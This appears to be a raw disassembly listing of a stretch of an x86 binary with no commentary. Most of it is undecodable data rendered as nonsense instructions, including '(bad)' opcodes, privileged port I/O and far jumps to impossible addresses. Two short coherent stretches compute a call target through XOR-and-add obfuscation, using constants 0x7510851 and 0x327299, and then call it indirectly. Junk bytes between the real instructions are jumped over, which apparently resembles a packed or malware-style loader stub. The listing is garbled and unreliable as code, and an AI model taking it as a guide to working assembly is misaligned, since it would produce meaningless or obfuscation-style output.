  41230a:	ins    BYTE PTR es:[edi],dx
  41230b:	fcomp  st(1)
  41230d:	mov    al,0x8f
  41230f:	imul   BYTE PTR [eax]
  412311:	jle    0x4122cc
  412313:	push   eax
  412314:	xchg   esp,eax
  412315:	jp     0x4122d8
  412317:	pop    ebx
  412318:	sbb    ah,BYTE PTR ds:0x629d266d
  41231e:	mov    al,ds:0x7f42a8c7
  412323:	bound  eax,QWORD PTR [edi+0x3b1d954a]
  412329:	xchg   DWORD PTR [eax-0xa],ebx
  41232c:	add    eax,0xdedee61a
  412331:	iret   
  412332:	mov    cl,0xa4
  412334:	jo     0x412339
  412336:	mov    bl,0x50
  412338:	pop    ds
  412339:	sbb    al,al
  41233b:	jnp    0x41234a
  41233d:	push   eax
  41233e:	test   BYTE PTR [edx+edx*1-0x1f],cl
  412342:	mov    eax,0x749c410a
  412347:	jmp    0x412348
  412349:	mov    ebx,0xf42d1c2d
  41234e:	add    ebx,eax
  412350:	pop    esp
  412351:	xor    ah,ch
  412353:	rcr    BYTE PTR [edx],1
  412355:	fwait
  412356:	lea    esp,[eax-0x16]
  412359:	push   esp
  41235a:	mov    eax,0xdabf62df
  41235f:	pop    ecx
  412360:	test   al,0xde
  412362:	mov    al,ds:0x3ec9b34b
  412367:	push   esp
  412368:	inc    edx
  412369:	jae    0x4123a3
  41236b:	cdq    
  41236c:	out    0xab,al
  41236e:	or     eax,0x682ebc0c
  412373:	std    
  412374:	mov    edi,0x81cb2e44
  412379:	dec    edi
  41237a:	adc    eax,0x641637de
  41237f:	xor    DWORD PTR ds:[esi+0x18],0x9ce05d9b
  412387:	pop    ebx
  412388:	jecxz  0x4123c2
  41238a:	leave  
  41238b:	mov    BYTE PTR [ebx+0x40ce98dd],0x7a
  412392:	push   es
  412393:	clc    
  412394:	scas   eax,DWORD PTR es:[edi]
  412395:	pop    ebp
  412396:	push   esp
  412397:	mov    DWORD PTR [eax],ecx
  412399:	pop    eax
  41239a:	jmp    0x7d55b6c3
  41239f:	cmp    BYTE PTR [ebx-0x6df4c50a],ch
  4123a5:	fidiv  DWORD PTR [ecx+0x7d54a674]
  4123ab:	pop    eax
  4123ac:	test   ah,0xb0
  4123af:	sub    esp,DWORD PTR [ecx+0x2f]
  4123b2:	jge    0x41240e
  4123b4:	dec    esi
  4123b5:	mov    edi,0x6b67fdd2
  4123ba:	push   esi
  4123bb:	lods   eax,DWORD PTR ds:[esi]
  4123bc:	inc    ebx
  4123bd:	mov    ecx,0x7ae0e41
  4123c2:	icebp  
  4123c3:	retf   
  4123c4:	out    0x97,al
  4123c6:	sbb    DWORD PTR [esi+0x15],ebx
  4123c9:	clc    
  4123ca:	adc    bl,BYTE PTR [ecx]
  4123cc:	xchg   edi,eax
  4123cd:	cmp    ah,bh
  4123cf:	inc    ebp
  4123d0:	iret   
  4123d1:	(bad)  
  4123d2:	int    0x7c
  4123d4:	mov    WORD PTR [ebx],es
  4123d6:	pop    edi
  4123d7:	aad    0x4c
  4123d9:	or     eax,0x44b30369
  4123de:	scas   eax,DWORD PTR es:[edi]
  4123df:	sbb    dh,al
  4123e1:	cmp    BYTE PTR [ecx+edx*4-0x1f],al
  4123e5:	sar    BYTE PTR [ebx-0x20],cl
  4123e8:	aas    
  4123e9:	jg     0x4123cf
  4123eb:	std    
  4123ec:	fistp  WORD PTR [ebp+0x429b9b44]
  4123f2:	leave  
  4123f3:	cli    
  4123f4:	loope  0x4123bf
  4123f6:	adc    al,0xe6
  4123f8:	and    al,0x29
  4123fa:	push   cs
  4123fb:	fadd   DWORD PTR [ecx]
  4123fd:	imul   ebx,DWORD PTR [eax+0x7d],0x66f2e297
  412404:	sbb    BYTE PTR [ebp+0x63],dh
  412407:	sub    al,0xae
  412409:	cmc    
  41240a:	cmp    DWORD PTR [ecx+0x5c],eax
  41240d:	test   al,0x17
  41240f:	in     eax,dx
  412410:	or     ebx,ebp
  412412:	into   
  412413:	daa    
  412414:	cmp    ah,BYTE PTR [edx]
  412416:	sub    eax,0x5eb6fa89
  41241b:	mov    cs,WORD PTR [edi+0x74857b65]
  412421:	adc    al,0xf1
  412423:	sbb    dh,BYTE PTR ds:0x936cfb23
  412429:	mov    eax,ds:0x4cfed449
  41242e:	push   ebp
  41242f:	fld    DWORD PTR [eax]
  412431:	nop
  412432:	xor    eax,0x49260ea3
  412437:	sar    BYTE PTR [ecx-0x64],cl
  41243a:	into   
  41243b:	push   cs
  41243c:	cwde   
  41243d:	sbb    bh,dl
  41243f:	jmp    0x63c20701
  412444:	jp     0x4123cc
  412446:	sub    BYTE PTR [edi],0x5d
  412449:	xchg   edx,eax
  41244a:	out    0xbe,al
  41244c:	loope  0x4123d9
  41244e:	scas   al,BYTE PTR es:[edi]
  41244f:	into   
  412450:	mov    al,ds:0x99c3285
  412455:	data16 sbb al,BYTE PTR [edi]
  412458:	mov    esi,0xc32c3be
  41245d:	mov    cl,0x77
  41245f:	lea    ecx,[ebx-0x2cadb991]
  412465:	jg     0x41244c
  412467:	xor    BYTE PTR [esp+esi*4],cl
  41246a:	push   esp
  41246b:	das    
  41246c:	lea    ebx,[esp+esi*1+0x12]
  412470:	mov    dh,0x22
  412472:	ret    0x6673
  412475:	xor    bh,BYTE PTR [eax]
  412477:	add    edx,esp
  412479:	and    eax,0xf7d118f5
  41247e:	mov    ds:0x354e838b,eax
  412483:	sar    DWORD PTR [ebp-0x302b6e26],0xb1
  41248a:	scas   al,BYTE PTR es:[edi]
  41248b:	jb     0x412412
  41248d:	es pushf 
  41248f:	pop    ecx
  412490:	push   ss
  412491:	cmp    BYTE PTR [edx],bh
  412493:	sub    al,0x58
  412495:	pop    eax
  412496:	retf   0xdf3b
  412499:	sub    esi,esp
  41249b:	pop    esi
  41249c:	aam    0xc4
  41249e:	test   BYTE PTR [edx-0x40],0x4d
  4124a2:	xchg   edx,eax
  4124a3:	shr    esi,0xda
  4124a6:	imul   al
  4124a8:	lahf   
  4124a9:	mov    esp,0x33d6c553
  4124ae:	xlat   BYTE PTR ds:[ebx]
  4124af:	jbe    0x412463
  4124b1:	ss and esi,edx
  4124b4:	push   ss
  4124b5:	cmp    BYTE PTR ds:0x4bae26da,bh
  4124bb:	jecxz  0x4124c9
  4124bd:	xchg   edi,eax
  4124be:	xchg   edi,eax
  4124bf:	out    dx,eax
  4124c0:	and    BYTE PTR [eax+0x215ea242],bh
  4124c6:	mov    ch,0xd8
  4124c8:	int    0xc2
  4124ca:	cmp    eax,0xecb49464
  4124cf:	pop    ds
  4124d0:	fiadd  DWORD PTR [ebx+0x77a9c3bc]
  4124d6:	scas   al,BYTE PTR es:[edi]
  4124d7:	dec    edx
  4124d8:	mov    al,0x2d
  4124da:	dec    ebx
  4124db:	mov    ch,0x3
  4124dd:	inc    ebp
  4124de:	or     BYTE PTR [ecx+0x458bf045],cl
  4124e4:	in     al,0x85
  4124e6:	ror    BYTE PTR [edi],0x84
  4124e9:	retf   0x4
  4124ec:	add    BYTE PTR [ecx+0xb6adc75],cl
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	test   dl,al
  4125a0:	cdq    
  4125a1:	sbb    DWORD PTR [ecx+0x5d],0x7f597e7e
  4125a8:	jle    0x412628
  4125aa:	jae    0x4125b3
  4125ac:	push   ecx
  4125ad:	arpl   WORD PTR [eax],dx
  4125af:	add    cl,bh
  4125b1:	sbb    edi,0x5d73c930
  4125b7:	mov    dh,cl
  4125b9:	mov    dh,0x97
  4125bb:	lods   eax,DWORD PTR ds:[esi]
  4125bc:	neg    DWORD PTR [edi]
  4125be:	mov    ebx,0x80774ec3
  4125c3:	cwde   
  4125c4:	mov    eax,0x75aa9988
  4125c9:	fisttp QWORD PTR [eax-0x5b]
  4125cc:	sub    ah,dl
  4125ce:	stos   DWORD PTR es:[edi],eax
  4125cf:	pop    esi
  4125d0:	jae    0x4125c2
  4125d2:	adc    eax,0x417a3ab
  4125d7:	mov    ecx,DWORD PTR ds:0x62529f9f
  4125dd:	jge    0x412656
  4125df:	mov    cl,0xb7
  4125e1:	mov    cl,0x22
  4125e3:	mov    ebp,0xcfd78097
  4125e8:	mov    ds:0xdca8182b,eax
  4125ed:	data16 fndisi(8087 only) 
  4125f0:	dec    ebx
  4125f1:	push   edx
  4125f2:	sbb    al,0xf6
  4125f4:	pop    ebp
  4125f5:	push   eax
  4125f6:	mov    ch,0xb8
  4125f8:	rol    BYTE PTR [esi],0xe1
  4125fb:	sub    bl,BYTE PTR [edi+0x320126d]
  412601:	lods   al,BYTE PTR ds:[esi]
  412602:	jmp    0x9210fb4
  412607:	popa   
  412608:	jge    0x41266f
  41260a:	adc    DWORD PTR [edx+0x5e181ba2],edx
  412610:	push   es
  412611:	js     0x412623
  412613:	(bad)  
  412614:	scas   al,BYTE PTR es:[edi]
  412615:	aas    
  412616:	sub    eax,DWORD PTR [edi+esi*2+0x6f2f2def]
  41261d:	dec    esi
  41261e:	sub    edi,DWORD PTR [edx+0x7e]
  412621:	add    bl,cl
  412623:	and    bh,ch
  412625:	clc    
  412626:	lods   eax,DWORD PTR ds:[esi]
  412627:	out    0x8e,al
  412629:	xor    eax,ebx
  41262b:	jg     0x412649
  41262d:	jae    0x412658
  41262f:	inc    ebp
  412630:	cli    
  412631:	sub    ebp,DWORD PTR [edx+ebx*1]
  412634:	ins    BYTE PTR es:[edi],dx
  412635:	hlt    
  412636:	pop    edi
  412637:	les    ebx,FWORD PTR [edx+0x76de9a5a]
  41263d:	adc    ch,ah
  41263f:	out    0x3d,eax
  412641:	pop    es
  412642:	mov    esp,0xc784ad75
  412647:	add    edx,ebx
  412649:	xchg   ecx,eax
  41264a:	test   DWORD PTR [ecx-0x66beaf70],ecx
  412650:	mov    edi,0x498432ab
  412655:	test   BYTE PTR [edi],0x44
  412658:	mov    ds:0x8b13629e,eax
  41265d:	rcl    BYTE PTR [ecx],1
  41265f:	imul   esi,DWORD PTR ds:0xb08b7c0e
  412666:	dec    eax
  412667:	inc    edi
  412668:	gs push ss
  41266a:	mov    ebx,0xd9e73392
  41266f:	fidivr DWORD PTR [ebx+0x1]
  412672:	pop    edx
  412673:	dec    ebx
  412674:	add    eax,0xec1c0bb0
  412679:	add    eax,0x491be9ff
  41267e:	pop    esi
  41267f:	inc    ecx
  412680:	sub    ah,dl
  412682:	sbb    BYTE PTR [eax+0x64a9a691],dl
  412688:	mov    eax,ds:0x1fc90a27
  41268d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41268e:	mov    ch,0xee
  412690:	xor    dh,bl
  412692:	outs   dx,DWORD PTR ds:[esi]
  412693:	aad    0xe5
  412695:	push   eax
  412696:	jp     0x412716
  412698:	outs   dx,DWORD PTR ds:[esi]
  412699:	bound  ebx,QWORD PTR [ebp+edx*1+0x712f7a95]
  4126a0:	ins    DWORD PTR es:[edi],dx
  4126a1:	ja     0x41263f
  4126a3:	xor    eax,0xcf488888
  4126a8:	dec    edi
  4126a9:	into   
  4126aa:	cld    
  4126ab:	je     0x412685
  4126ad:	and    bl,BYTE PTR [esi+0x47]
  4126b0:	call   0xff242afe
  4126b5:	les    ecx,FWORD PTR [ecx]
  4126b7:	add    al,0xa8
  4126b9:	xor    eax,0xe7415094
  4126be:	daa    
  4126bf:	or     esp,eax
  4126c1:	rcr    DWORD PTR [ecx-0x68],cl
  4126c4:	mov    al,ds:0x1675ca49
  4126c9:	imul   ecx,DWORD PTR [edx],0x68
  4126cc:	pop    eax
  4126cd:	mov    dl,0x4c
  4126cf:	jmp    0x1680:0x3177825b
  4126d6:	dec    esi
  4126d7:	cmp    DWORD PTR [esi],edi
  4126d9:	and    edi,DWORD PTR [edi]
  4126db:	pop    ebp
  4126dc:	mov    BYTE PTR [ecx],dh
  4126de:	pop    edi
  4126df:	jnp    0x41275a
  4126e1:	push   0xffffff98
  4126e3:	jae    0x41266c
  4126e5:	mov    cl,dl
  4126e7:	sbb    dh,bl
  4126e9:	sbb    BYTE PTR [edx+esi*2],bh
  4126ec:	int    0xe4
  4126ee:	pop    esi
  4126ef:	inc    esi
  4126f0:	enter  0xd9,0xc6
  4126f4:	adc    esp,ebp
  4126f6:	aaa    
  4126f7:	xchg   ebx,eax
  4126f8:	or     DWORD PTR [ecx],edi
  4126fa:	push   esp
  4126fb:	jle    0x4126c0
  4126fd:	and    edi,ebx
  4126ff:	mov    cl,0xa5
  412701:	add    bl,BYTE PTR [edi]
  412703:	adc    DWORD PTR [esi+0x54],esi
  412706:	mov    dl,0x5
  412708:	mov    al,0x6f
  41270a:	xchg   DWORD PTR [ebx],ebx
  41270c:	sbb    BYTE PTR [ebx-0x5b],ah
  41270f:	mov    bl,0x97
  412711:	out    dx,al
  412712:	jo     0x41272e
  412714:	lods   al,BYTE PTR ds:[esi]
  412715:	xchg   edx,eax
  412716:	ret    
  412717:	pushf  
  412718:	cmp    al,0x19
  41271a:	rol    BYTE PTR [edi-0x13],1
  41271d:	or     al,0x18
  41271f:	aas    
  412720:	das    
  412721:	mov    dh,BYTE PTR [edx]
  412723:	push   ebx
  412724:	mov    ch,0xe1
  412726:	xchg   BYTE PTR [ebp+0x45],cl
  412729:	xor    edx,DWORD PTR [esi+0x68]
  41272c:	loope  0x412768
  41272e:	push   edi
  41272f:	add    dh,BYTE PTR [esi+ebp*2+0x47190c85]
  412736:	and    ebp,DWORD PTR [eax-0x51]
  412739:	or     al,0x4f
  41273b:	and    eax,0x8a12976b
  412740:	(bad)  ds:0xad71be6c
  412746:	jno    0x41272f
  412748:	bound  ebx,QWORD PTR ds:0x6132c1bc
  41274e:	pop    edi
  41274f:	mov    cl,0x85
  412751:	or     eax,0xcfa1cd70
  412756:	add    DWORD PTR [ebp-0x1ba8f46e],esi
  41275c:	xor    BYTE PTR [edi],bh
  41275e:	dec    ecx
  41275f:	imul   esp,DWORD PTR [esi+0x4d800a52],0xa9e096d6
  412769:	jo     0x412705
  41276b:	adc    dl,cl
  41276d:	loope  0x4127c1
  41276f:	and    eax,0xf6cb9cd2
  412774:	mov    cl,0xd5
  412776:	popa   
  412777:	mov    esp,DWORD PTR [ebp-0xbb76b4a]
  41277d:	popf   
  41277e:	out    0xd5,eax
  412780:	dec    edx
  412781:	push   esi
  412782:	jge    0x41273b
  412784:	in     al,0x9d
  412786:	mov    DWORD PTR [ebx-0x26c0771f],edx
  41278c:	dec    ebx
  41278d:	xor    eax,ecx
  41278f:	jmp    0x41298f
  412794:	aaa    
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	dec    ebp
  4127a1:	cdq    
  4127a2:	fsincos 
  4127a4:	inc    esp
  4127a5:	pop    edi
  4127a6:	jle    0x412826
  4127a8:	pop    ecx
  4127a9:	jg     0x412829
  4127ab:	jle    0x412812
  4127ad:	dec    edi
  4127ae:	ja     0x41275a
  4127b0:	pop    es
  4127b1:	aad    0xad
  4127b3:	xchg   ebx,eax
  4127b4:	nop
  4127b5:	clc    
  4127b6:	dec    ebp
  4127b7:	sahf   
  4127b8:	push   ss
  4127b9:	or     BYTE PTR [ebx+0x51f691e9],bl
  4127bf:	cmc    
  4127c0:	retf   
  4127c1:	jmp    0x1f92:0xbe1fdc24
  4127c8:	lods   al,BYTE PTR ds:[esi]
  4127c9:	sub    al,0xf1
  4127cb:	inc    edx
  4127cc:	push   ebx
  4127cd:	clc    
  4127ce:	pusha  
  4127cf:	inc    eax
  4127d0:	or     eax,0xfa4e7768
  4127d5:	push   ebx
  4127d6:	(bad)  
  4127d7:	out    dx,al
  4127d8:	xchg   esp,eax
  4127d9:	stos   BYTE PTR es:[edi],al
  4127da:	out    dx,eax
  4127db:	xchg   bh,dh
  4127dd:	ret    0xee35
  4127e0:	and    BYTE PTR [eax],ah
  4127e2:	test   al,0x84
  4127e4:	and    ecx,edi
  4127e6:	sbb    bh,bl
  4127e8:	sbb    eax,0x35e75722
  4127ed:	shr    BYTE PTR [ebp*8-0x2ac2514b],1
  4127f4:	push   ecx
  4127f5:	sub    BYTE PTR [eax+0x2def2069],al
  4127fb:	xor    eax,0xa1f3cf88
  412800:	ror    BYTE PTR [esi],0x41
  412803:	jge    0x41278f
  412805:	cdq    
  412806:	push   esi
  412807:	mov    ds:0xe5926543,al
  41280c:	jp     0x41280f
  41280e:	push   edi
  41280f:	sub    eax,0xee4d3bcd
  412814:	xchg   esi,eax
  412815:	mov    bh,0xd2
  412817:	gs jnp 0x412879
  41281a:	popf   
  41281b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41281c:	aas    
  41281d:	adc    cl,BYTE PTR [ebx+esi*8+0x52]
  412821:	lock mov al,ds:0xf8bcd37
  412827:	sub    ch,ch
  412829:	mov    bh,0xb9
  41282b:	jnp    0x412899
  41282d:	or     BYTE PTR [eax],0x38
  412830:	mov    eax,ds:0xfdfa69ac
  412835:	into   
  412836:	retf   0xd5b
  412839:	cmp    esi,DWORD PTR [edx]
  41283b:	ror    BYTE PTR [ebp-0x2925150e],1
  412841:	dec    ecx
  412842:	loopne 0x4128c3
  412844:	arpl   WORD PTR [edx],si
  412846:	cmp    edi,DWORD PTR [esi]
  412848:	adc    esp,esi
  41284a:	outs   dx,DWORD PTR ds:[esi]
  41284b:	(bad)  
  41284c:	out    dx,eax
  41284d:	xchg   ebx,eax
  41284e:	push   eax
  41284f:	cli    
  412850:	mov    bl,0x88
  412852:	dec    DWORD PTR [edi+0x2cb5b215]
  412858:	pop    esi
  412859:	test   BYTE PTR [ecx+0x5cee5d7f],ch
  41285f:	pusha  
  412860:	stc    
  412861:	les    edi,FWORD PTR ds:0x1f3703ad
  412867:	inc    ecx
  412868:	or     DWORD PTR [esi-0x7465a863],ebp
  41286e:	lods   al,BYTE PTR ds:[esi]
  41286f:	xchg   edx,eax
  412870:	pop    ds
  412871:	mov    ds:0x1e053bde,eax
  412876:	mov    edi,0x67b7148c
  41287b:	js     0x4128d2
  41287d:	or     al,0xe1
  41287f:	lods   eax,DWORD PTR ds:[esi]
  412880:	test   BYTE PTR [eax],0x99
  412883:	jecxz  0x41284b
  412885:	push   0xffffffad
  412887:	out    0x0,eax
  412889:	xchg   edx,eax
  41288a:	es jmp 0x412843
  41288d:	mov    es:0x4d906ac6,eax
  412893:	sub    al,0x87
  412895:	or     bl,cl
  412897:	fisttp DWORD PTR [edx-0x5a]
  41289a:	sbb    DWORD PTR ds:0x1f6a9504,esi
  4128a0:	jle    0x412897
  4128a2:	add    ch,BYTE PTR [eax+0x789816c5]
  4128a8:	sbb    cl,BYTE PTR [ebp+0x17388027]
  4128ae:	mov    edx,0xba0d65a1
  4128b3:	dec    ebx
  4128b4:	dec    edx
  4128b5:	pop    esi
  4128b6:	sbb    eax,0x5569e51d
  4128bb:	jnp    0x4128ca
  4128bd:	lods   eax,DWORD PTR ds:[esi]
  4128be:	mov    esi,0x6bb570a9
  4128c3:	jns    0x412876
  4128c5:	pop    es
  4128c6:	jle    0x41287e
  4128c8:	adc    eax,0xb6b54689
  4128cd:	cwde   
  4128ce:	jae    0x4128a2
  4128d0:	mov    ch,BYTE PTR ds:[ecx]
  4128d3:	mov    bl,0x53
  4128d5:	addr16 push edx
  4128d7:	ins    BYTE PTR es:[edi],dx
  4128d8:	mov    edx,edx
  4128da:	gs int3 
  4128dc:	mov    ecx,es
  4128de:	call   FWORD PTR [esi-0x37982e21]
  4128e4:	rcr    BYTE PTR [eax-0x39d2a328],0x1d
  4128eb:	(bad)  
  4128ec:	and    edi,DWORD PTR [eax-0x37f1832e]
  4128f2:	xor    DWORD PTR [esp+edx*2+0x36],esi
  4128f6:	icebp  
  4128f7:	sub    edx,esi
  4128f9:	(bad)  
  4128fb:	xchg   esi,eax
  4128fc:	xchg   BYTE PTR [edx],bl
  4128fe:	push   0xffffffe0
  412900:	sbb    eax,0x3d0b8b54
  412905:	jae    0x4128e7
  412907:	dec    esp
  412908:	mov    al,0xf7
  41290a:	in     al,0x93
  41290c:	retf   
  41290d:	pop    ds
  41290e:	dec    eax
  41290f:	cdq    
  412910:	sub    al,0xca
  412912:	shr    WORD PTR [ecx-0x1c6de5d5],cl
  412919:	mov    cl,0x9
  41291b:	pop    ecx
  41291c:	imul   ecx,DWORD PTR [edx-0x5855de9b],0x57
  412923:	jbe    0x4128c2
  412925:	jecxz  0x4128d1
  412927:	pop    esi
  412928:	(bad)  [edx+0x1eb4e4bc]
  41292e:	ss sbb eax,0xda70ea1
  412934:	loope  0x412912
  412936:	mov    DWORD PTR [edx+eiz*4-0x46b43f9b],0x1c362101
  412941:	pop    esp
  412942:	dec    edx
  412943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412944:	push   ss
  412945:	loope  0x4128db
  412947:	jnp    0x412929
  412949:	ja     0x4128eb
  41294b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41294c:	int    0xfc
  41294e:	out    0x28,eax
  412950:	fdiv   st,st(0)
  412952:	sub    eax,0xc96e99d0
  412957:	inc    DWORD PTR [ebp+0x58]
  41295a:	cs jmp 0x4129d6
  41295d:	ins    DWORD PTR es:[edi],dx
  41295e:	aas    
  41295f:	mov    WORD PTR [eax],fs
  412961:	push   ss
  412962:	sbb    al,0xac
  412964:	lods   eax,DWORD PTR ds:[esi]
  412965:	mov    esp,0x11e4c08b
  41296a:	imul   edi,DWORD PTR [esi],0xffffff90
  41296d:	retf   
  41296e:	xor    DWORD PTR [ebp-0xbb1bcde],ebp
  412974:	imul   esi,DWORD PTR [ecx-0x66],0xd25d7a2c
  41297b:	push   0xc5fe73b9
  412980:	inc    ecx
  412981:	loopne 0x41295e
  412983:	mov    ebx,0xf3c5a13e
  412988:	inc    esp
  412989:	or     eax,DWORD PTR [edx+0x3b47b68f]
  41298f:	add    eax,esi
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fadd   DWORD PTR [ebp-0x5832eab8]
  4129f3:	pop    ecx
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
  4129f7:	jg     0x412a77
  4129f9:	jle    0x4129c8
  4129fb:	or     DWORD PTR [ecx+0x4633ceed],0x2e48d0b7
  412a05:	mov    ah,cl
  412a07:	push   edi
  412a08:	sub    ch,BYTE PTR [ebp+0x1b1068df]
  412a0e:	push   DWORD PTR [ebp+0x4308f5d8]
  412a14:	mov    al,ds:0x2d2daa08
  412a19:	jae    0x412a1a
  412a1b:	cdq    
  412a1c:	call   0xe290:0x9d5b135f
  412a23:	js     0x4129b2
  412a25:	cwde   
  412a26:	add    DWORD PTR [ebp+edx*1+0x2b],edi
  412a2a:	cs xchg esi,eax
  412a2c:	inc    edx
  412a2d:	xchg   esp,eax
  412a2e:	pop    esi
  412a2f:	mov    dh,0xa4
  412a31:	dec    edi
  412a32:	jl     0x4129c6
  412a34:	xor    al,0xf2
  412a36:	retf   0xf21d
  412a39:	jnp    0x4129d3
  412a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a3c:	in     al,0x64
  412a3e:	jns    0x412a42
  412a40:	test   eax,0x6cd12a7f
  412a45:	cwde   
  412a46:	repz aad 0x42
  412a49:	inc    ecx
  412a4a:	movaps xmm2,XMMWORD PTR [ebx+0x3245f5f2]
  412a51:	adc    dl,BYTE PTR [esi-0x3c15e559]
  412a57:	out    0x1e,al
  412a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a5a:	jmp    0xb347aa22
  412a5f:	dec    ebp
  412a60:	test   DWORD PTR [esi+0x7f],ecx
  412a63:	mov    edx,DWORD PTR [edi]
  412a65:	add    ah,al
  412a67:	icebp  
  412a68:	dec    eax
  412a69:	pop    edx
  412a6a:	mov    esp,ds
  412a6c:	adc    edx,0x17de24f0
  412a72:	fcmovu st,st(5)
  412a74:	dec    esp
  412a75:	in     eax,0x7c
  412a77:	jo     0x412ada
  412a79:	or     al,0x1c
  412a7b:	pop    ebp
  412a7c:	push   edx
  412a7d:	or     al,0x9e
  412a7f:	dec    ebx
  412a80:	sub    DWORD PTR [eax-0xdc189af],0x5f
  412a87:	arpl   WORD PTR [esi-0x1e],ax
  412a8a:	call   0x3b77805c
  412a8f:	push   edx
  412a90:	in     eax,0x7a
  412a92:	test   eax,0x17e1b3f
  412a97:	xchg   ecx,eax
  412a98:	test   BYTE PTR [esi+esi*1+0x9],ch
  412a9c:	scas   al,BYTE PTR es:[edi]
  412a9d:	inc    ecx
  412a9e:	inc    ebx
  412a9f:	jl     0x412aac
  412aa1:	gs loop 0x412a83
  412aa4:	adc    ecx,DWORD PTR [esi]
  412aa6:	cmp    DWORD PTR [esi-0x61568cdb],eax
  412aac:	xlat   BYTE PTR ds:[ebx]
  412aad:	or     bl,BYTE PTR [ebp-0x38]
  412ab0:	nop    DWORD PTR [esi+0xb]
  412ab4:	sub    ebx,DWORD PTR [edx-0x497319bc]
  412aba:	xor    cl,BYTE PTR [ebx-0x9cd416f]
  412ac0:	aaa    
  412ac1:	push   DWORD PTR [edx+esi*2]
  412ac4:	jns    0x412b26
  412ac6:	xchg   ecx,eax
  412ac7:	mov    BYTE PTR [ebx],ah
  412ac9:	mov    ds:0xa3d5f62,al
  412ace:	jo     0x412ab2
  412ad0:	sahf   
  412ad1:	mov    es:0x6fe7444b,eax
  412ad7:	in     eax,dx
  412ad8:	jecxz  0x412adf
  412ada:	popa   
  412adb:	pushf  
  412adc:	xchg   BYTE PTR [ecx+ebp*4-0x415ad637],al
  412ae3:	mov    ebp,0x81a87003
  412ae8:	out    0xb4,eax
  412aea:	xlat   BYTE PTR ds:[ebx]
  412aeb:	xchg   esp,eax
  412aec:	pop    es
  412aed:	ret    0xbbd9
  412af0:	addr16 loop 0x412ae4
  412af3:	jbe    0x412b22
  412af5:	call   0xc909:0xce308ee2
  412afc:	cmp    esp,edx
  412afe:	outs   dx,DWORD PTR ds:[esi]
  412aff:	push   es
  412b00:	mov    al,ds:0x3387acc0
  412b05:	sahf   
  412b06:	ret    
  412b07:	jmp    0x1a99:0xdd0a517b
  412b0e:	or     eax,0x599a664
  412b14:	rcr    BYTE PTR [edx-0x65279c09],cl
